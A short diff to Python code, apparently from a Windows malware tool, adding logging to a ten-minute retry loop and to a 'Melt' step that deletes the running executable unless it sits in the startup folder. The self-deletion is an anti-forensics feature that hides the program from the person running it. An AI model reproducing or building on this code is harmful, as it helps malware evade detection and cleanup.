+                if isinstance(e, KeyboardInterrupt): # If the user pressed CTRL+C then exit
+                    os._exit(1)
+                Logger.critical(e, exc_info= True) # Print the error message
+                Logger.info("There was an error, retrying after 10 minutes")
                 time.sleep(600) # Wait for 10 minutes and try again
         
         if Utility.GetSelf()[1] and Settings.Melt and not Utility.IsInStartup(): # Delete the file if melt option is enabled and the file is not in the startup (exe mode)
+            Logger.info("Deleting the file")
             Utility.DeleteSelf() # Delete the current file
+        
+        Logger.info("Process ended")
